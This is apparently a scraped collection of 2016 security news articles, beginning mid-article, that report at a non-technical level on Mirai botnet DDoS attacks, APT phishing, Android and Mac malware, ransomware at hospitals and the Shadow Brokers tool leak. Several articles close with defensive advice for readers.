assertion that this malicious Chrome extension was installing the Locky malware is incorrect. Also, the company believes that the impact of the attack on Facebook has been very limited, as it requires an additional step to install software onto victim's browser or computer. If you are one of those who had been tricked into installing one of the two malicious extensions, you can remove it immediately. To remove the offending extension, just go to Menu → More Tools → Extensions and check for the extension and remove it. However, if you have been unlucky and you would have ended up with the Locky ransomware and the only way for restoring your files is: A regular backup. If not, you are screwed up! Blaze advises, \"As always, be wary when someone sends you just an 'image' – especially when it is not how he or she would usually behave.\"" }

The group of nation-state hackers, also known as Cozy Bear, APT29, and CozyDuke, is the one of those involved in the recent data breach of the Democratic National Committee (DNC) and is allegedly tied to the Russian government. On Wednesday, the hackers sent a series of phishing emails to dozens of targets associated with non-governmental organizations (NGOs), policy think tanks in the US and even inside the US government, said security firm Volexity. Phishing Attacks Powered by 'PowerDuke' Malware The phishing emails were sent from purpose-built Gmail accounts and other compromised email accounts at Harvard University's Faculty of Arts and Sciences (FAS), trying to trick victims into opening tainted attachments containing malware and clicking on malicious links. Once this was done, the phishing e-mail dropped a new variant of Backdoor malware, dubbed \"PowerDuke,\" giving attackers remote access to the compromised systems. PowerDuke is an extremely sophisticated piece of malware in both its way of infecting people as well as concealing its presence. Besides making use of wide variety of approaches, PowerDuke uses steganography to hide its backdoor code in PNG files. The firm spotted and reported at least five waves of phishing attacks targeting people who work for organizations, including Radio Free Europe/Radio Liberty, the RAND Corporation, the Atlantic Council, and the State Department, among others. \"Three of the five attack waves contained links to download files from domains that the attackers appear to have control over,\" the firm said in a blog post. \"The other two attacks contained documents with malicious macros embedded within them. Each of these different attack waves was slightly different from one another.\" Beware of Post-Election Themed Phishing Emails All the phishing emails were election-themed. Why? After Trump won the US presidential election, half of America, as well as people across the world, mourning the result was curious to know about the victory of Trump. People even started searching on Google: How did Donald Trump win the US presidential election?, Were the election flawed? Why did Hillary Clinton lose? Hackers took advantage of this curiosity to target victims, especially those who worked with the United States government and were much more concerned about Trump's victory. Two of the emails claimed to have come from the Clinton Foundation giving insight of the elections, two others purported to be documents pertaining to the election's outcome being revised or rigged, and the last one offered a link to a PDF download on 'Why American Elections Are Flawed.' The emails were sent using the real email address of a professor at Harvard, which indicates that the hackers likely hacked the professor's email and then used his account to send out the phishing emails. The emails either contained malicious links to .ZIP files or included malicious Windows shortcut files linked to a \"clean\" Rich Text Format document and a PowerShell script. Once clicked, the script installed PowerDuke on a victim's computer that could allow attackers to examine and control the target system. The malware has the capability to secretly download additional malicious files and evade detection from antivirus products. Security firm CrowdStrike claimed in June 2016 that the hacking team Cozy Bear has previously hacked into networks belonging to the White House, State Department, and the United States Joint Chiefs of Staff." }

In his blog post, Kevin Beaumont claimed that a Liberian transit provider confirmed him about the DDoS attack of more than 500 Gbps targeting one undersea cable servicing Internet connectivity for the entire country. Later, some media outlets also confirmed that the DDoS attack caused Internet outage in some parts of the country, citing ‘slow Internet’ and ‘total outage’ experienced by some local sources and citizens. \"The DDoS is killing our business. We have a challenge with the DDoS. We are hoping someone can stop it. It's killing our revenue. Our business has frequently been targeted\" an employee with one Liberian mobile service provider told PC World. Network firm Level 3 confirmed Zack Whittaker of ZDNet that it had seen attacks on telecoms companies in Liberia making access to the web spotty. Other reports suggested mobile net access was affected too. \"At first I thought it was a problem with my internet provider, which often suffers from slow speeds. But this feels more serious. Even when you do get online, the connection repeatedly cuts out.\" BBC Africa's Jonathan Paye-Layleh in Liberia shared his experience. Of course, based on the high concern, the story went viral and Kevin's research was covered by other media outlets, including BBC, PC World, The Guardian, Forbes, IBtimes, Quartz, Mashable, although few of them interpreted the incident incorrectly and claimed that the attack took down the entire country's Internet. In our article, we explicitly mentioned multiple times that criminals are \"using Mirai Botnet to shut down the Internet for an entire country\" and \"trying to take down the Internet of Liberia.\" The only mistake in our previous article was the image caption which briefly said, \"DDoS takes down entire country offline.\" We apologize to our readers for an incorrect image caption, which has now been corrected. Latest Insights On Liberia DDoS Attack Story After Kevin’s story, some new developments with more insights have appeared. Doug Madory, the Director of Internet Analysis at Dyn Research tweeted that DYN and Internet-infrastructure company Akamai have no data that supports any nationwide Internet outage in Liberia. The Hacker News has also been contacted by Kpetermeni Siakor, who manages infrastructure at the Liberia Internet Exchange Point, stating that only Lonestarcell MTN, one of the country's four major telecommunication companies, faced 500 Gbps of DDoS attack for a short period, which was mitigated successfully. \"From inspecting our logs at the Liberia IXP, we didn't see any downtime in the past three weeks. The general manager of the CCL also couldn't confirm any issues with the ACE cable,\" Siakor said. In our previous article, the primary concern surrounds around two facts: The Mirai Botnet capability and ACE submarine fiber-optic cable capacity. Where just 100,000 Mirai bots were successful in knocking down the majority of Internet Offline two weeks ago, how easy it could be for millions of bots to DDoS the ACE submarine fiber-optic cable, whose total capacity is just 5.12 Tbps that is being shared between all of the 23 countries, including Liberia. So, when we said that someone was trying to take the entire country down, we meant that cyber criminals have such capacity to do so, and since they have targeted one network operator, does not mean they would not attack other network operators that could impact the Internet services in the country. Mirai Malware Threat: Protect Your IoT Devices The incidents involving the Mirai malware is extremely worrying because it can take over insecure cameras, DVRs, and routers, which are widely available all around the world – Thanks to lazy manufacturers and customers. Mirai malware scans for Internet of Things (IoT) devices that are still using their default passwords and then enslaves those devices into a botnet, which is then used to launch DDoS attacks. So, the best way to protect yourself and your devices is to be more vigilant about the security of your smart devices. In our previous article, we provided some basic, rather practical, solutions that will help you protect your IoT devices from becoming part of the Mirai botnet. You can also check also yourself if your IoT device is vulnerable to Mirai malware." }

Someone is trying to take down the whole Internet of a country, and partially succeeded, by launching massive distributed denial-of-service (DDoS) attacks using a botnet of insecure IoT devices infected by the Mirai malware. It all started early October when a cyber criminal publicly released the source code of Mirai – a piece of nasty IoT malware designed to scan for insecure IoT devices and enslaves them into a botnet network, which is then used to launch DDoS attacks. Just two weeks ago, the Mirai IoT Botnet caused vast internet outage by launching massive DDoS attacks against DNS provider Dyn, and later it turns out that just 100,000 infected-IoT devices participated in the attacks. Experts believe that the future DDoS attack could reach 10 Tbps, which is enough to take down the whole Internet in any nation state. One such incident is happening from past one week where hackers are trying to take down the entire Internet of Liberia, a small African country, using another Mirai IoT botnet known as Botnet 14. Security researcher Kevin Beaumont has noticed that Botnet 14 has begun launching DDoS attacks against the networks of \"Lonestar Cell MTN \", the telecommunication company which provides the Internet to 10-15% of Liberia via a single entry point from undersea fiber cable. \"From monitoring, we can see websites hosted in country going offline during the attacks — Additionally, a source in country at a Telco has confirmed to a journalist they are seeing intermittent internet connectivity, at times which directly match the attack,\" Beaumont said in a blog post published today. According to Beaumont, transit providers confirm that the attacks were over 500 Gbps in size, but last for a short period. This volume of traffic indicates that the \"Shadows Kill\" Botnet, as the researcher called it, is \"owned by the actor which attacked Dyn.\" Why Taking Down Liberia's Internet Is easy? Over a decade of civil war in Liberia destroyed the country's telecommunications infrastructure, and at that time a very small portion of citizens in Liberia had access to the internet via satellite communication. However, some progress were made later in 2011 when a 17,000 km Africa Coast to Europe (ACE) submarine fiber-optic cable was deployed from France to Cape Town, via the west coast of Africa. The ACE fiber cable, at depths close to 6,000 meters below sea level, eventually provides broadband connectivity to more 23 countries in Europe and Africa. What's shocking? The total capacity of this cable is just 5.12 Tbps, which is shared between all of the 23 countries. Since massive DDoS attack against DynDNS used a Mirai botnet of just 100,000 hacked IoT devices to close down the Internet for millions of users, one can imagine the capability of more than 1 Million hacked IoT devices, which is currently in control of the Mirai malware and enough to severely impact systems in any nation state. This is extremely worrying because, with this capacity, not just Liberia, an attacker could disrupt the Internet services in all 23 countries in Europe and Africa, which relies on the ACE fiber cable for their internet connectivity. The root cause? More insecure, vulnerable IoT devices, more Mirai bots. So, in order to protect yourself, you need to be more vigilant about the security of your smart devices because they are dumber than one can ever be. In our previous article, we provided some basic, rather effective, solutions, which would help you protect your smart devices from becoming part of the Mirai botnet. You can also check also yourself if your IoT device is vulnerable to Mirai malware. Head on to this article." }

They are not just hacking your email and online banking accounts anymore. Computer viruses do not distinguish between a personal computer or a hospital machine delivering therapy to patients — and the results could prove deadly. Cyber attacks on hospitals have emerged as a significant cyber security risk in 2016, which not only threaten highly sensitive information but also potentially harm the very lives of those being protected. In the latest incident, hundreds of planned operations, outpatient appointments, and diagnostic procedures have been canceled at multiple hospitals in Lincolnshire, England, after a \"major\" computer virus compromised the National Health Service (NHS) network on Sunday. In a bright-red alert warning labeled \"Major incident\" on its website, the Northern Lincolnshire and Goole NHS Foundation Trust (NLAG) said its systems in Scunthorpe and Grimsby were infected with a virus on October 30. The incident forced the trust to shut down all the major systems within its shared IT network in order to \"isolate and destroy\" the virus and cancel surgeries. \"We have taken the decision, following expert advice, to shut down the majority of our systems so we can isolate and destroy it,\" the NHS wrote on its website. \"All planned operations, outpatient appointments and diagnostic procedures have been canceled for Wednesday, Nov. 2 with a small number of exceptions.\" Some patients, including major trauma patients and high-risk women in labor, were diverted to neighbouring hospitals. Although the majority of systems are now back and working, the NHS Trust has not provided any specific information about the sort of virus or malware or if it managed to breach any defense. The incident took place after the U.S. and Canada issued a joint cyber alert, warning hospitals and other organizations against a surge in extortion attacks that infect computers with Ransomware that encrypts data and demand money for it to be unlocked. Although it is unclear at the moment, the virus could likely be a ransomware that has previously targeted hospitals and healthcare facilities. Life Threatening Cyber-Attacks With the rise in Ransomware threat, we have seen an enormous growth in the malware businesses. The countless transactions of Bitcoins into the dark web have energized the Ransomware authors to distribute and adopt new infection methods for the higher successful rate. Today, Ransomware have been a soft target for both Corporates as well as Hospitals. Since earlier this year, over a dozen hospitals have been targeted by ransomware, enforcing them to pay the ransom amount as per the demand by freezing the central medical systems. Technological advancement in the medical arena has digitalized patients data in the form of Electronic Medical Record (EMR) in order to save them into the hospital's central database. Since the delay in patients treatment by temporary locking down their details could even result in the patient's death, the attackers seek 100 percent guarantee ransom by infecting hospitals with Ransomware. Due to this reason, in most of the cases, hospitals generally agrees to pay the ransom amount to the attackers. Earlier this year, the Los Angeles-based Presbyterian Medical Center paid $17,000 in Bitcoins to cyber crooks in order to restore access to its electronic medical systems, after a ransomware virus hit the hospital. Also back in April, the MedStar Health chain that runs a number of hospitals in the Baltimore and Washington area, was attacked with Samsam ransomware (or Samas) that encrypted sensitive data at the hospitals. Followingly, many more hospitals, including Methodist Hospital in Henderson and Kentucky, Desert Valley Hospital in California and Chino Valley Medical Center, have been infected with Ransomware." }

Just 100,000 devices. I did not miss any zeros. Dyn disclosed on Wednesday that a botnet of an estimated 100,000 internet-connected devices was hijacked to flood its systems with unwanted requests and close down the Internet for millions of users. Dyn executive vice president Scott Hilton has issued a statement, saying all compromised devices have been infected with a notorious Mirai malware that has the ability to take over cameras, DVRs, and routers. \"We're still working on analyzing the data but the estimate at the time of this report is up to 100,000 malicious endpoints,\" Hilton said. \"We are able to confirm that a significant volume of attack traffic originated from Mirai-based botnets.\"Mirai malware scans for Internet of Things (IoT) devices that are still using their default passwords and then enslaves those devices into a botnet, which is then used to launch DDoS attacks. A day after the attack, Dyn confirmed that a botnet of Mirai malware-infected devices had participated in its Friday's Distributed Denial of Service attacks. However, after an initial analysis of the junk traffic, just yesterday, the company revealed that it had identified an estimated 100,000 sources of malicious DDoS traffic, all originating from IoT devices compromised by the Mirai malware. Earlier the company believed that approximately \"tens of millions\" of IP addresses were responsible for the massive attack against its crucial systems, but the actual number came out to be much much less, leaving all of us wondering, as: How did the Attack Succeed to this Massive Level? To this, Hilton said that Domain Name System protocol itself has the ability to amplify requests from legitimate sources. \"For example, the impact of the attack generated a storm of legitimate retry activity as recursive servers attempted to refresh their caches, creating 10-20X normal traffic volume across a large number of IP addresses,\" Hilton said. \"When DNS traffic congestion occurs, legitimate retries can further contribute to traffic volume.\" \"It appears the malicious attacks were sourced from at least one botnet, with the retry storm providing a false indicator of a significantly larger set of endpoints than we now know it to be.\"Friday's cyber attack overwhelmed Dyn's central role in routing and managing Internet traffic, rendering hundreds of sites and services, including Twitter, GitHub, Amazon, Netflix, Pinterest, Etsy, Reddit, PayPal, and AirBnb, inaccessible to Millions of people worldwide for several hours. Dyn did not disclose the actual size of the attack, but it has been speculated that the DDoS attack could be much bigger than the one that hit French Internet service and hosting provider OVH that peaked at 1.1 Tbps, which is the largest DDoS attack known to date. According to the company, this attack has opened up an important debate about Internet security and volatility. \"Not only has it highlighted vulnerabilities in the security of 'Internet of Things' (IOT) devices that need to be addressed, but it has also sparked further dialogue in the Internet infrastructure community about the future of the Internet,\" Hilton said. Next DDoS Attack could reach Tens Of Terabits-Per-Second If the IoT security is not taken seriously, the future DDoS attack could reach tens of terabits-per-second, as estimated by network security firm Corero. The DDoS threat landscape is skyrocketing and could reach tens of terabits-per-second in size, following a discovery of a new zero-day attack vector that has the ability to amplify DDoS attacks by as much as 55x, Corero warned in a blog post published Tuesday. According to the security firm, this new attack vector uses the Lightweight Directory Access Protocol (LDAP), which if combined with an IoT botnet, could break records in DDoS power. Dave Larson of Corero explains: \"LDAP is not the first, and will not be the last, protocol or service to be exploited in this fashion. Novel amplification attacks like this occur because there are so many open services on the Internet that will respond to spoofed record queries. However, a lot of these attacks could be eased by proper service provider hygiene, by correctly identifying spoofed IP addresses before these requests are admitted to the network.\" You can read more on Corero's official website. How to Protect your Smart Device from being Hacked 1. Change Default Passwords of your connected devices: If you have got any internet-connected device at home or work, change your credentials if it still uses default ones. Keep in mind; Mirai malware scans for default settings. 2. Disable Universal Plug-and-Play (UPnP): UPnP comes enabled by default in every IoT device, which creates a hole in your router's security, allowing malware to infiltrate any part of your local network. Check for \"Universal Plug and Play\" features and turn them OFF. 3. Disable Remote Management through Telnet: Go into your router’s settings and disable remote management protocol, specifically through Telnet, as this is a protocol used for allowing one computer to control another from a remote location. It has also been used in previous Mirai attacks. 4. Check for Software Updates and Patches: last but not the least, always keep your connected devices and routers up-to-date with the latest vendor firmware. Check if your IoT device is vulnerable to Mirai malwareThere is an online tool called Bullguard's IoT Scanner that can help you check if any IoT device over your network is vulnerable to Mirai malware. If it detects any, contact the device's manufacturer or lookout for a solution to patch those vulnerable gaps. The tool makes use of the vulnerability scanning service Shodan for finding unprotected computers and webcams on your home network that are exposed to the public and potentially accessible to hackers." }

Now, the same previously found designing weakness has been exploited to gain unfettered \"root\" access to millions of Android smartphones, allowing potentially anyone to take control of affected devices. Researchers in the VUSec Lab at Vrije Universiteit Amsterdam have discovered a vulnerability that targets a device's dynamic random access memory (DRAM) using an attack called Rowhammer. Although we are already aware of the Rowhammer attack, this is the very first time when researchers have successfully used this attack to target mobile devices. What is DRAM Rowhammer Attack? The Rowhammer attack against mobile devices is equally dangerous because it potentially puts all critical data on millions of Android phones at risk, at least until a security patch is available. The Rowhammer attack involves executing a malicious application that repeatedly accesses the same \"row\" of transistors on a memory chip in a tiny fraction of a second in a process called \"Hammering.\" As a result, hammering a memory region can disturb neighboring row, causing the row to leak electricity into the next row which eventually causes a bit to flip. And since bits encode data, this small change modifies that data, creating a way to gain control over the device. In short, Rowhammer is an issue with new generation DRAM chips in which repeatedly accessing a row of memory can cause \"bit flipping\" in an adjacent row that could allow anyone to change the value of contents stored in the memory. Is Your Android Phone Vulnerable? To test the Rowhammer attack on mobile phones, the researchers created a new proof-of-concept exploit, dubbed DRAMMER, and found their exploit successfully altered crucial bits of data in a way that completely roots big brand Android devices from Samsung, OnePlus, LG, Motorola, and possibly other manufacturers. The researchers successfully rooted Android handsets including Google's Nexus 4 and Nexus 5; LG's G4; Samsung Galaxy S4 and Galaxy S5, Motorola's Moto G models from 2013 and 2014; and OnePlus One. \"Not only does our [DRAMMER] attack show that practical, deterministic Rowhammer attacks are a real threat to billions of mobile users, but it is also the first effort to show that Rowhammer is...(reliably exploitable) on any platform other than x86 and with a much more limited software feature set than existing solutions,\" the researchers wrote in their paper [PDF] titled, \"Drammer: Deterministic Rowhammer Attacks on Mobile Platforms.\" How does the DRAMMER Attack Work? (Exploit Source Code) The researchers created an app — containing their rooting exploit — that requires no special user permissions in order to avoid raising suspicion. The DRAMMER attack would then need a victim to download the app laced with malware (researchers' exploit code) to execute the hack. The researchers took advantage of an Android mechanism called the ION memory allocator to gain direct access to the dynamic random access memory (DRAM). Besides giving every app direct access to the DRAM, the ION memory allocator also allows identifying adjacent rows on the DRAM, which is an important factor for generating targeted bit flips. Knowing this, the researchers then had to figure out how to use the bit flipping to achieve root access on the victim's device, giving them full control of the target phone and the ability to do anything from accessing data to taking photos. \"On a high level, our technique works by exhausting available memory chunks of different sizes to drive the physical memory allocator into a state in which it has to start serving memory from regions that we can reliably predict,\" the paper reads. \"We then force the allocator to place the target security-sensitive data, i.e., a page table, at a position in physical memory which is vulnerable to bit flips and which we can hammer from adjacent parts of memory under our control.\" Once you download this malicious app, the DRAMMER exploit takes over your phone within minutes – or even seconds – and runs without your interaction. The attack continues to run even if you interact with the app or put your phone in \"sleep\" mode. The researchers expect to soon publish an app [source code available here] that will let you test your Android smartphone yourself and anonymously include your results in a running tally, which will help researchers track the list of vulnerable devices. DRAMMER Has No Quick Fix The group of researchers privately disclosed its findings to Google in July, and the company designated the flaw as \"critical,\" awarding the researchers $4,000 under its bug bounty program. Google says the company has informed its manufacturing partners of the issue earlier this month and has developed a mitigation which it will include in its upcoming November security bulletin to make the DRAMMER attack much harder to execute. However, the researchers warned that one could not replace the memory chip in Android smartphones that have already been shipped. And even some software features that DRAMMER exploits are so fundamental and essential to any OS that they are difficult to remove or modify without impacting the user experience. In short, the attack is not easy to patch in the next generation of Android phones. Video Demonstration of DRUMMER Attack on Android 6.0.1 The researchers have also published two proof-of-concept videos that demonstrate DRAMMER attack in action against an unrooted LG Nexus 5. In the first video, the phone is running Android 6.0.1 with security patches Google released on October 5. In the second video, the researchers show how the DRAMMER attack can be combined with Stagefright bug that remains unpatched in many older Android handsets. The Stagefright exploit gives the researchers an advanced shell, and by running the DRAMMER exploit, the shell gains root access. The researcher's exploit can target the majority of the world's Android phones. \"Our research shows that practical large-scale Rowhammer attacks are a serious threat and while the response to the Rowhammer has been relatively slow from vendors, we hope our work will accelerate mitigation efforts both in industry and academia,\" the researchers concluded. The group research focuses on Android rather than iOS because the researchers are intimately familiar with the Google's mobile OS which is based on Linux. But the group says it would theoretically be possible to replicate the same attack in an iPhone with additional research. A team of researchers from VUSec at Vrije Universiteit Amsterdam, the University of California at Santa Barbara, and the Graz University of Technology has conducted the research, and they'll be presenting their findings later this week at the 23rd ACM Conference on Computer and Communications Security in Vienna, Austria. For more detailed information, you can head on to this informational page about DRAMMER and this paper published early this morning." }

Researchers have discovered a new Android banking Trojan that masquerades primarily as a video plugin, like Adobe Flash Player, pornographic app, or video codec, and asks victims to send a selfie holding their ID card, according to a blog post published by McAfee. The Trojan is the most recent version of Acecard that has been labeled as one of the most dangerous Android banking Trojans known today, according to Kaspersky Lab Anti-malware Research Team. Once successfully installed, the trojan asks users for a number of device's permissions to execute the malicious code and then waits for victims to open apps, specifically those where it would make sense to request payment card information. Acecard Steals your Payment Card and Real ID details The banking trojan then overlays itself on top of the legitimate app where it proceeds to ask users for their payment card number and card details such as card holder's name, expiration date, and CVV number. \"It displays its own window over the legitimate app, asking for your credit card details,\" explains McAfee researcher Bruce Snell. \"After validating the card number, it goes on to ask for additional information such as the 4-digit number on the back.\" Once this is done, the trojan then looks to obtain users' personal information, including their name, date of birth, mailing address, for \"verification purposes,\" and even requests a photo of the front and back sides of their ID card. After this, the Trojan also prompts to ask users to hold their ID card in their hand, underneath their face, and take a selfie. Hackers can make illegal Transfers and Take Over your Online Accounts All these pieces of information are more than enough for an attacker to verify illegal banking transactions and steal access to victims' social media accounts by confirming the stolen identities. So far this version of Acecard Android banking Trojan has impacted users in Singapore and Hong Kong. This social engineering trick of Trojan obviously is not new, and any tech-savvy users would quickly catch this malicious behavior as there is no reason for Google to ask for your ID card. But the trick still works with non and less technical users. Since all of these fake apps have been distributed outside of Google Play Store, users are strongly advised to avoid downloading and installing apps from untrusted sources. Besides this, users should pay attention to the permissions apps are asking for. Most importantly: No app needs a photo of you holding your ID card except perhaps a mobile banking service. So, always be cautious before doing that." }

Hackers are Spreading Malware Through Fake Software", "Address" : "https://thehackernews.com/2016/10/best-encryption-tools.html", "Date" : "2016-10-11T00:07:00-11:00", "Article" : "Over the past few years, Internet users globally have grown increasingly aware of online privacy and security issues due to mass monitoring and surveillance by government agencies, making them adopt encryption software and services. But it turns out that hackers are taking advantage of this opportunity by creating and distributing fake versions of encryption tools in order to infect as many victims as possible. Kaspersky Lab has revealed an advanced persistent threat (APT) group, nicknamed StrongPity, which has put a lot of efforts in targeting users of software designed for encrypting data and communications. The StrongPity APT group has been using watering-hole attacks, infected installers, and malware for many years to target users of encryption software by compromising legitimate sites or setting up their own malicious copycat sites. Watering hole attacks are designed to lure specific groups of users to their interest-based sites that typically house malicious files or redirect them to attacker-controlled downloads. The StrongPity APT group has managed to infect users in Europe, Northern Africa, and the Middle East and targeted two free encryption utilities in different attacks: WinRAR and TrueCrypt. WinRAR and TrueCrypt are long popular within security and privacy conscious users. WinRAR is best known for its archiving capabilities that encrypting files with AES-256 crypto, while TrueCrypt is a full-disk encryption utility that locks all files on a hard drive. By setting up fake distribution sites that closely mimic legitimate download sites, StrongPity is able to trick users into downloading malicious versions of these encryption apps in hopes that users encrypt their data using a trojanized version of WinRAR or TrueCrypt apps, allowing attackers to spy on encrypted data before encryption occurred. \"The problem with people depending on tools like this isn’t the strength of the crypto, but more about how it's distributed,\" says Kurt Baumgartner, principal security researcher at Kaspersky Lab. \"This is that problem that StrongPity is taking advantage of.\" Booby-Trapped WinRAR and TrueCrypt Downloads The APT group previously set up TrueCrypt-themed watering holes in late 2015, but their malicious activity surged in end of summer 2016. Between July and September, dozens of visitors have redirected from tamindir[.]com to true-crypt[.]com with unsurprisingly almost all of the focus on computer systems in Turkey, with some victims in the Netherlands. However, in WinRAR case, instead of redirecting victims to a website controlled by StrongPity, the group hijacked the legitimate winrar.it website to host a malicious version of the file themselves. The winrar.it website infected users mostly in Italy, with some victims in countries like Belgium, Algeria, Tunisia, France, Morocco and Cote D'Ivoire, while the attackers controlled site, winrar.be, infected users in Belgium, Algeria, Morocco, the Netherlands, and Canada. Top Countries infected with StrongPity APT malware According to Kaspersky, more than 1,000 systems infected with StrongPity malware this year. The top five countries affected by the group are Italy, Turkey, Belgium, Algeria and France. The StrongPity APT's dropper malware was signed with \"unusual digital certificates,\" but the group didn't re-use its fake digital certificates. It downloaded components include a backdoor, keyloggers, data stealers and other crypto-related software programs, including the putty SSH client, the filezilla FTP client, the Winscp secure file transfer program and remote desktop clients. The dropper malware not only provides the hackers control of the system, but also allows them to steal disk contents and download other malware that would steal communication and contact information. Therefore, users visiting sites and downloading encryption-enabled software are advised to verify both the validity of the distribution website as well as the integrity of the downloaded file itself. Download sites that not use PGP or any strong digital code signing certificate are required to re-examine the necessity of doing so for the benefits of them as well as their own customers, explained Baumgartner." }

It's not because Mac OS X is getting worse every day, but because hackers are getting smart and sophisticated these days. The bad news for Mac users is that malware targeting webcams and microphones has now come up for Mac laptops as well. Patrick Wardle, an ex-NSA staffer who heads up research at security intelligence firm Synack, discovered a way for Mac malware to tap into your live feeds from Mac's built-in webcam and microphone to locally record you even without detection. Wardle is the same researcher who has discovered a number of security weaknesses in Apple products, including ways to bypass the Gatekeeper protections in OS X. Wardle also released a free tool called RansomWhere? earlier this year that has generic detection capabilities for Mac OS X ransomware variants. Wardle is scheduled to present his new findings at the Virus Bulletin conference in Denver later today, along with his research demonstrating how malware could easily piggyback on your legitimate webcam sessions to keep its spying activity hidden. Yes, piggybacking legitimate webcam sessions initiated by you. Here's How Mac Malware Works: Since Mac's firmware-level protection lights the green LED for any unauthorized access to user's webcam, Wardle believes that attackers can use a malicious app that quietly monitors the system for any outgoing feed of an existing webcam session – like a Skype or FaceTime call – where the light indicator would already be ON. The malware then piggybacks the victim's webcam or microphone to secretly record both audio and video session, without any visible indication of this malicious activity and any fear of detection. In his paper presentation, titled 'Getting Duped: Piggybacking on Webcam Streams for Surreptitious Recordings,' Wardle outlines the threat along with countermeasures to detect \"secondary\" processes that try to access an existing video session on OS X. How to Prevent Your WebCam and Mic from Being HackedWardle has developed and released a free tool, dubbed OverSight, which not only monitors webcam and microphone activities but also alerts you when a secondary process accesses your webcam, asking whether you want to allow or block access. Oversight is a free download from Wardle’s website. Moreover, physically covering your webcam – like what Facebook CEO Mark Zuckerberg and FBI Director James Comey do – also offers a low-tech approach to keeping snoopers away." }

Discovered by security researchers at Cisco Talos group, the zero-day flaw, assigned as TALOS-2016-0193/CVE-2016-8332, could allow an out-of-bound heap write to occur that triggers the heap corruption and leads to arbitrary code execution. OpenJPEG is an open-source JPEG 2000 codec. Written in C language, the software was developed for coding and encoding JPEG2000 images, a format that is often used for tasks like embedding image files within PDF documents through popular software including PdFium, Poppler, and MuPDF. Hackers can exploit the security vulnerability by tricking the victim into opening a specially crafted, malicious JPEG2000 image or a PDF document containing that malicious file in an email. The hacker could even upload the malicious JPEG2000 image file to a file hosting service, like Dropbox or Google Drive, and then send that link to the victim. Once downloaded to the system, it would create a way for hackers to remotely execute malicious code on the affected system. The flaw was caused \"due to an error while parsing mcc records in the jpeg2000 file,...resulting in an erroneous read and write of adjacent heap area memory,\" Cisco explained in its advisory. \"Careful manipulation of heap layout and can lead to further heap metadata process memory corruption ultimately leading to code execution under attacker control.\" The researchers successfully tested the JPEG 2000 image exploit on the OpenJPEG openjp2 version 2.1.1. The flaw was discovered by Aleksandar Nikolic from the Cisco Talos Security team. The team reported the zero-day flaw to OpenJPEG developers in late July, and the company patched the flaw last week with the release of version 2.1.2. The vulnerability has been assigned a CVSS score of 7.5, categorizing it as a high-severity bug." }

Just recently we saw a record-breaking Distributed Denial of Service (DDoS) attacks against the France-based hosting provider OVH that reached over one Terabit per second (1 Tbps), which was carried out via a botnet of infected IoT devices. Now, such attacks are expected to grow more rapidly as someone has just released the source code for IoT botnet, which was 'apparently' used to carry out world's largest DDoS attacks. Internet of Things-Botnet 'Mirai' Released Online Dubbed Mirai, the malware is a DDoS Trojan that targets BusyBox systems, a collection of Unix utilities specifically designed for embedded devices like routers. The malware is programmed to hijack connected IoT devices that are using the default usernames and passwords set by the factory before devices are first shipped to customers. Spotted by Brian Krebs, the \"Mirai\" source code was released on Hackforums, a widely used hacker chat forum, on Friday. However, there is no concrete evidence that this is the same botnet malware that was used to conduct record-breaking DDoS attacks on Krebs' or OVH hosting website. Reportedly, the attack code has built-in scanners that look for vulnerable smart devices in homes and enroll them into a network of Botnet, that hackers and cyber criminals can then use in a DDoS attack to temporarily shut down any website. The hacker, nicknamed \"Anna-senpai,\" who released the Mirai source code said they have \"made their money...so it's time to GTFO.\" \"So today, I have an amazing release for you,\" Anna-senpai wrote. \"With Mirai, I usually pull max 380k bots from telnet alone. However, after the Kreb [sic] DDoS, ISPs been slowly shutting down and cleaning up their act. Today, max pull is about 300k bots, and dropping.\" Even after the above explanation, I am still wondering why the malware's author chose to dump the code online over making big money. Beware: Don't Download It Or Use at your own risk! I apologize, if you are looking for the download link. We came across hundreds of such malware and their source codes, but ethically we don’t prefer to promote them through our articles because that could indirectly advantage more blackhat hackers to cause further damages. What if the source code contains any backdoor? It is not at all surprising to believe so, as we have seen several cases in past years, when hackers have taken advantage of trending or hot events (or incidents), in this case record-breaking DDoS attack, to post and distribute their backdoored malware strategically. Now that the malware is publicly released, anyone can download and use it to infect a large number of devices worldwide to create their own IoT botnet. And if the code contains any backdoor, it would not only compromise the user who downloads it from the hacking forum but also hijacks those who are part of that user's botnet network. So, we advise beginner and our enthusiast readers not to rush to download Mirai IoT Botnet files. Since manufacturers of IoT devices majorly focus on performance and usability and ignore security measures and encryption mechanisms, they are routinely being hacked and used as weapons in cyber attacks. Just recently we reported about vulnerable D-Link routers that are programmed in such a way that they contain several backdoors, which allow attackers to remotely hijack and control them, as well as network, leaving all connected devices vulnerable to cyber attacks. So, if you own one or more IoT devices, the first thing you need to do in order to protect yourself against cyber attacks is change those default credentials." }

It has been found that the NSA itself was not directly hacked, but a former NSA employee carelessly left those hacking tools on a remote server three years ago after an operation and a group of Russian hackers found them, sources close to the investigation told Reuters. The leaked hacking tools, which enable hackers to exploit vulnerabilities in systems from big vendors like Cisco Systems, Juniper, and Fortinet, were dumped publicly online by the group calling itself \"The Shadow Brokers.\" NSA officials have also admitted to the FBI that their careless employee acknowledged the error shortly afterward, and hence the agency was aware of its operative's mistake from last three years. But instead of warning the affected companies that their customers were at risk, the NSA maintained the silence. \"After the discovery, the NSA tuned its sensors to detect [the] use of any of the tools by other parties, especially foreign adversaries with strong cyber espionage operations, such as China and Russia,\" Reuters reports. Well, that's Bullshit! If they call it a 'tactic.'

We are still waiting for the comments from the NSA, the FBI and the Office of the Director of National Intelligence about the matter. Since the initial leak of NSA's hacking tools last month and confirmation of the leaked vulnerabilities being legitimate by Cisco and Fortinet, the intelligence agency and online community has been finding out the working exploits in the data dump that are still unknown and used in the wild. Just recently, Cisco revealed a new zero-day vulnerability from the leaked data dump that had been used by hackers to target some of its customers, which indicates that hackers would likely continue to take advantage of the now-exposed exploits to conduct cyber attacks." }

